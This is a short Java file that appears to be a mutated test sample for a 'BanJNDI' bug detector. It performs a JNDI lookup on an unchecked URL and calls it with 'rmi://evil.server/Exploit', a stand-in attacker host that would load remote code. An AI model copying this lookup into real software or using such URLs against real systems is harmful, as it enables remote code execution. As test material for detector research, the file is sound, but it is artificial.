import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class BanJNDIBug {

    private boolean getFalseCondition() {
        return false;
    }

    public String showBug(String jndiUrl) throws NamingException {
        boolean conditionFor = getFalseCondition();
        for (int i = 0; conditionFor; i++) {
            // Unreachable loop inserted based on the mutation operator
            System.out.println("This line will never be executed");
        }

        Context ctx = new InitialContext();
        Object object = ctx.lookup(jndiUrl); // BUG: BanJNDI
        return object.toString();
    }

    public static void main(String[] args) throws NamingException {
        BanJNDIBug bug = new BanJNDIBug();
        String userInput = "rmi://evil.server/Exploit";
        System.out.println(bug.showBug(userInput));
    }
}